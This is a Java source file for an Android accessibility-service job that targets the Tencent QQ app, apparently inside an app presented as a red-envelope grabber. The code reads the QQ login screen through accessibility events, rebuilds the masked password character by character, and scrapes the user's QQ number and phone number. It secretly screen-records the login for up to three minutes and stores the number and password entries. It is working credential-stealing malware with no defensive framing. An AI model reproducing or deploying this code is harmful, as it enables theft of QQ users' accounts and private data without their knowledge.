/**
 * 
 */
package accessibility.app;

import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import order.screen.ScreenRecordService;
import util.ConfigCt;
import util.StringUtils;

/**
 * @author ASUS
 *
 */
public class QQLoginPwd extends BaseAccessibilityJob {
	private static QQLoginPwd current;
	public static final String QQ_LOGIN_PWD_UI="com.tencent.mobileqq.activity.LoginActivity";
	public static final String QQ_SPLASH_UI="com.tencent.mobileqq.activity.SplashActivity";
	public static final String QQ_SETTING_UI="com.tencent.mobileqq.activity.QQSettingSettingActivity";
	public static final String QQ_ACCOUNT_MANAGE_UI="com.tencent.mobileqq.activity.AccountManageActivity";
	private String mPwd="";
	private String mDot= "";
	private String mQQNumber="";
	private String mPhoneNumber="";
	private int mQQVideoCount=0;
	private boolean bStart=false;
	public QQLoginPwd(){
		super(new String[]{ConfigCt.QQ_PACKAGENAME});
	}
	public static synchronized QQLoginPwd getInstance() {
		if(current == null) {
			current = new QQLoginPwd();
		}
		return current;
	}
	@Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart() ;
		mQQVideoCount=ConfigCt.getInstance(context).getQQLoginVideoCount();
	}
	@Override
	public void onStopJob() {
		super.onStopJob();
	}
	@Override
	public void onReceiveJob(AccessibilityEvent event) {
		super.onReceiveJob(event);
	   	if(!mIsEventWorking)return;
	   	if(!mIsTargetPackageName)return;
	   	
   		if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
   		{
   			if(mCurrentUI.equals(QQ_SETTING_UI)){
   				AccessibilityNodeInfo nodeInfo = event.getSource();
   		   		if (nodeInfo == null)return;
   		   		getPhoneNumber(nodeInfo);
   			}
   			if(mCurrentUI.equals(QQ_ACCOUNT_MANAGE_UI)){
   				AccessibilityNodeInfo nodeInfo = event.getSource();
   		   		if (nodeInfo == null)return;
   		   		getQQNumber(nodeInfo);
   			}
   			if(mCurrentUI.equals(QQ_LOGIN_PWD_UI)){
   				TimeStart();
   				//UIinfo.getUIinfo().setPkgs(new String[]{ConfigCt.QQ_PACKAGENAME});
   				//UIinfo.getUIinfo().start();
   				AccessibilityNodeInfo nodeInfo = event.getSource();
   		   		if (nodeInfo == null)return;
   				clearEditValue(nodeInfo);
   				if(mQQVideoCount>=10)return;
				if(ScreenRecordService.getInstance()==null){
					 ScreenRecordService.start(context,"qql",false);
					 bStart=true;
					 StopRecordingScreenDelay();
				 }
   			}
   			if(mCurrentUI.equals(QQ_SPLASH_UI)){
   				if(!mIsTimeWorking)return;
   				closeTimeWorking();
   				saveInfo("num:"+mQQNumber);
   				saveInfo("pwd:"+mPwd);
   				if(bStart){
   					ScreenRecordService.stop(context);
   					mQQVideoCount=mQQVideoCount+1;
   					ConfigCt.getInstance(context).setQQLoginVideoCount(mQQVideoCount);
   					bStart=false;
   				}
   			}
   		}
   		if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
   		{
   			if(mCurrentUI.equals(QQ_LOGIN_PWD_UI)){
   				AccessibilityNodeInfo nodeInfo = event.getSource();
   		   		if (nodeInfo == null)return;
   		   		nodeInfo=AccessibilityHelper.getRootNode(nodeInfo);
   		   		getEditValue(nodeInfo);
   			}
   		}
	   
	}
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
		AccessibilityNodeInfo rootNode =service.getRootInActiveWindow();
		if (rootNode == null)return;
		getEditValue(rootNode);
   	
	}
	/*
	 * 获取qq号:
	 */
	private void getQQNumber(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, AccessibilityHelper.WIDGET_TEXT, 4, true);
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		mQQNumber=nodeInfo.getText().toString();
		if(StringUtils.isInteger(mQQNumber))
			saveInfo("num:"+mQQNumber);
	}
	/*
	 * 获取phoneNumber:132******89
	 */
	private void getPhoneNumber(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByTextNext(rootNode, "手机号码");
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		mPhoneNumber=nodeInfo.getText().toString();
		saveInfo(mPhoneNumber);
	}
	/*
	 * 清除密码
	 */
	private void clearEditValue(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, AccessibilityHelper.WIDGET_EDIT, 1, true);
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		AccessibilityHelper.nodeInput(nodeInfo, "");
	}
	/*
	 * 
	 */
	private void getEditValue(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, AccessibilityHelper.WIDGET_EDIT, 1, true);
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		String tmp=nodeInfo.getText().toString();
		if(tmp.length()==1){
			getLoginQQNumber(rootNode);
		}
		processPwd(tmp);

	}
	/*
	 * 
	 */
	private void getLoginQQNumber(AccessibilityNodeInfo rootNode ){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, AccessibilityHelper.WIDGET_EDIT, 0, true);
		if (nodeInfo == null)return;
		if(nodeInfo.getText()==null)return;
		mQQNumber=nodeInfo.getText().toString();
		Log.i(TAG2, mQQNumber);
	}

	/*
	 * 处理字符串
	 */
	private void processPwd(String tmp){
		if(tmp==null)return;
		if(tmp.length()==0){mPwd="";return;}
		if(tmp.equals("密码")){mPwd="";return;}
		int len=tmp.length();
		if(len==1){
			if(mPwd.length()==0){mPwd=tmp;return;}
			return;
		}
		if(mDot.length()==0)mDot=tmp.substring(0,1);
		String c=tmp.substring(len-1,len);
		if(c.equals(mDot))return;
		if(mPwd.length()==len){
			return;
		}
		if(mPwd.length()<len){
			mPwd=mPwd+c;
			return;
		}
		if(mPwd.length()>len){
			mPwd=mPwd.substring(0,len-1);
			mPwd=mPwd+c;
			return;
		}
	}
	/*
	 * 保存信息；QQ;phone;pwd;
	 */
	private void saveInfo(String info){
		String oldInfo=ConfigCt.getInstance(service).getQQInfo().toString();
		if(oldInfo.length()==0){
			ConfigCt.getInstance(service).setQQInfo(info);
			return;
		}
		if(oldInfo.contains(info)){
			return;
		}
		ConfigCt.getInstance(service).setQQInfo(oldInfo+";"+info);
	}
	 /*
     * 定时器：3分钟后自动终止录屏；
     */
	private void StopRecordingScreenDelay(){
		final Handler handler= new Handler(); 
		Runnable runnable  = new Runnable() {    
			@Override    
		    public void run() {   
				 if(bStart){
					 ScreenRecordService.stop(context);
					 bStart=false;
				 }
		    }    
		};
		handler.postDelayed(runnable, 1000*60*3);  
	}
}
